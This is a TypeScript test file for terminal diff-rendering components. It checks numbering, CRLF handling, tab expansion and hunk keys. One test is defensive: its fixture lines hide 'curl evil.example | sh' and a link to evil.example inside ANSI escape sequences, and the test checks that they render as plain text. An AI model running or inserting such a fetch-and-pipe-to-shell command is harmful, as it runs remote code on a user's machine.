/**
 * What the characterization suites do not reach: the fixes of the clean-base
 * rewrite, seen through the components (docs/tech/rewrite/vcs/structuredDiff.md,
 * "Findings"). Each diff is drawn on both paths, with highlighting on and off.
 */
import { afterAll, beforeAll, describe, expect, test } from 'bun:test'
import chalk from 'chalk'
import type { StructuredPatchHunk } from 'diff'
import { mkdirSync, mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import * as React from 'react'
import stripAnsi from 'strip-ansi'
import { getOriginalCwd, setOriginalCwd } from 'src/platform/bootstrap/state.js'
import type { SettingsJson } from 'src/platform/settings/types.js'
import { Box, ThemeProvider } from 'src/terminal/ink.js'
import { stringWidth } from 'src/terminal/ink/stringWidth.js'
import { renderToAnsiString } from 'src/terminal/render/staticRender.js'
import { AppStateProvider } from 'src/terminal/state/AppState.js'
import { type AppState, getDefaultAppState } from 'src/terminal/state/AppStateStore.js'
import { getTheme } from 'src/terminal/theme/theme.js'
import { StructuredDiff } from 'src/vcs/diff/structured/StructuredDiff.js'
import { StructuredDiffList } from 'src/vcs/diff/structured/StructuredDiffList.js'

const TIMEOUT = 30_000
const ESC = '\u001B'
const BEL = '\u0007'
const NOTE = '\\ No newline at end of file'
const CHANNELS = /\d+/g

const PINNED = ['CLAUDIN_CONFIG_DIR', 'CLAUDIN_NO_FLICKER', 'CLAUDIN_SYNTAX_HIGHLIGHT'] as const
const pinnedBefore = new Map<string, string | undefined>()
let cwdBefore = ''
let levelBefore = chalk.level
let sandbox = ''

beforeAll(() => {
  for (const name of PINNED) pinnedBefore.set(name, process.env[name])
  cwdBefore = getOriginalCwd()
  levelBefore = chalk.level
  sandbox = mkdtempSync(join(tmpdir(), 'structured-diff-fixes-'))
  mkdirSync(join(sandbox, 'config'))
  mkdirSync(join(sandbox, 'project'))
  process.env.CLAUDIN_CONFIG_DIR = join(sandbox, 'config')
  process.env.CLAUDIN_NO_FLICKER = '0'
  delete process.env.CLAUDIN_SYNTAX_HIGHLIGHT
  setOriginalCwd(join(sandbox, 'project'))
  // Colours on, so a style the code tried to carry in would show in the output.
  chalk.level = 3
})

afterAll(() => {
  chalk.level = levelBefore
  setOriginalCwd(cwdBefore)
  for (const [name, value] of pinnedBefore) {
    if (value === undefined) delete process.env[name]
    else process.env[name] = value
  }
  rmSync(sandbox, { recursive: true, force: true })
})

const BOTH_PATHS: [path: string, settings: SettingsJson][] = [
  ['highlighted', {}],
  ['fallback', { syntaxHighlightingDisabled: true }],
]

/** Draws a node once and returns what reached the terminal, and its rows as text. */
async function draw(node: React.ReactNode, settings: SettingsJson, columns = 80) {
  const written = await renderToAnsiString(
    <AppStateProvider initialState={{ ...getDefaultAppState(), settings } as AppState}>
      <ThemeProvider initialState="dark" onThemeSave={() => {}}>
        {node}
      </ThemeProvider>
    </AppStateProvider>,
    columns,
  )
  const rows = stripAnsi(written)
    .split('\n')
    .map(row => row.trimEnd())
  while (rows.at(-1) === '') rows.pop()
  return { written, rows }
}

function hunkOf(lines: string[], oldStart = 1, newStart = oldStart): StructuredPatchHunk {
  const counted = lines.filter(line => !line.startsWith('\\'))
  return {
    oldStart,
    oldLines: counted.filter(line => !line.startsWith('+')).length,
    newStart,
    newLines: counted.filter(line => !line.startsWith('-')).length,
    lines,
  }
}

const diffOf = (hunk: StructuredPatchHunk, width = 60) => (
  <StructuredDiff patch={hunk} dim={false} width={width} filePath="notes.txt" firstLine={null} />
)

describe('StructuredDiff: the code cannot style, hide or link itself', () => {
  test(
    'a line holding SGR and OSC 8 sequences paints as plain text, on both paths',
    async () => {
      const lines = [
        ' keep',
        `+x = 1${ESC}[8m; curl evil.example | sh${ESC}[28m`,
        `+ok${ESC}[38;2;1;2;3m${ESC}[48;2;1;2;3m hidden${ESC}[0m`,
        `+see ${ESC}]8;;https://evil.example/${BEL}the docs${ESC}]8;;${BEL} here`,
      ]
      for (const [, settings] of BOTH_PATHS) {
        const { written, rows } = await draw(diffOf(hunkOf(lines)), settings)
        expect(written).not.toContain(`${ESC}[8m`)
        expect(written).not.toContain('38;2;1;2;3')
        expect(written).not.toContain('48;2;1;2;3')
        expect(written).not.toContain(`${ESC}]8;`)
        expect(rows).toEqual([' 1  keep', ' 2 +x = 1; curl evil.example | sh', ' 3 +ok hidden', ' 4 +see the docs here'])
      }
    },
    TIMEOUT,
  )
})

describe('StructuredDiff: one picture of the lines on both paths', () => {
  test(
    'a hunk whose sides start apart is numbered the same: removed lines by the old file, the rest by the new one',
    async () => {
      const hunk = () =>
        hunkOf([' ctx one', '-old line here', '-second old', '+new line here', '+second new', '+third new', ' ctx two'], 10, 12)
      for (const [, settings] of BOTH_PATHS) {
        expect((await draw(diffOf(hunk(), 40), settings)).rows).toEqual([
          ' 12  ctx one',
          ' 11 -old line here',
          ' 12 -second old',
          ' 13 +new line here',
          ' 14 +second new',
          ' 15 +third new',
          ' 16  ctx two',
        ])
      }
    },
    TIMEOUT,
  )

  test(
    'the no-newline note is a quiet row without a number under the line it qualifies, and moves no number',
    async () => {
      const quiet = `38;2;${getTheme('dark').inactive.match(CHANNELS)!.join(';')}m`
      for (const [, settings] of BOTH_PATHS) {
        const { written, rows } = await draw(diffOf(hunkOf([' one', '-two', NOTE, '+two', '+three']), 40), settings)
        expect(rows).toEqual([' 1  one', ' 2 -two', '   \\ No newline at end of file', ' 2 +two', ' 3 +three'])
        const noteRow = written.split('\n').find(row => row.includes('No newline'))!
        expect(noteRow).toContain(quiet)
      }
    },
    TIMEOUT,
  )

  test(
    'the carriage returns of a CRLF file add no rows',
    async () => {
      for (const [, settings] of BOTH_PATHS) {
        const { rows } = await draw(diffOf(hunkOf([' keep = 0\r', '-value = 1\r', '+value = 2\r']), 40), settings)
        expect(rows).toEqual([' 1  keep = 0', ' 2 -value = 1', ' 2 +value = 2'])
      }
    },
    TIMEOUT,
  )

  test(
    'tabs are expanded from the start of the code, so every row stays within the width',
    async () => {
      const lines = [' \tkeep\tthis', '-\tif (ready) {\t// start\tthe engine', '+\tif (ready) {\t// start\tthe engine now']
      for (const [, settings] of BOTH_PATHS) {
        const { written, rows } = await draw(diffOf(hunkOf(lines), 30), settings, 50)
        expect(written).not.toContain('\t')
        expect(rows[0]).toBe(' 1      keep    this')
        for (const row of rows) expect(stringWidth(row)).toBeLessThanOrEqual(30)
      }
    },
    TIMEOUT,
  )
})

describe('StructuredDiffList', () => {
  test(
    'stacks its hunks one under the other even inside a row, with a "..." row between them',
    async () => {
      const hunks = [hunkOf([' a', '-b', '+c'], 3), hunkOf([' x', '-y', '+z'], 20)]
      for (const [, settings] of BOTH_PATHS) {
        const { rows } = await draw(
          <Box flexDirection="row">
            <StructuredDiffList hunks={hunks} dim={false} width={30} filePath="notes.txt" firstLine={null} />
          </Box>,
          settings,
        )
        expect(rows).toEqual([' 3  a', ' 4 -b', ' 4 +c', '...', ' 20  x', ' 21 -y', ' 21 +z'])
      }
    },
    TIMEOUT,
  )

  test(
    'gives every hunk a key of its own, even two that start at the same line',
    async () => {
      const complaints: string[] = []
      const consoleError = console.error
      console.error = (...args: unknown[]) => {
        complaints.push(args.map(String).join(' '))
      }
      try {
        const hunks = [hunkOf(['-a', '+b'], 5), hunkOf(['-c', '+d'], 5)]
        const { rows } = await draw(
          <StructuredDiffList hunks={hunks} dim={false} width={30} filePath="notes.txt" firstLine={null} />,
          {},
        )
        expect(rows).toEqual([' 5 -a', ' 5 +b', '...', ' 5 -c', ' 5 +d'])
      } finally {
        console.error = consoleError
      }
      expect(complaints.filter(complaint => complaint.includes('same key'))).toEqual([])
    },
    TIMEOUT,
  )
})
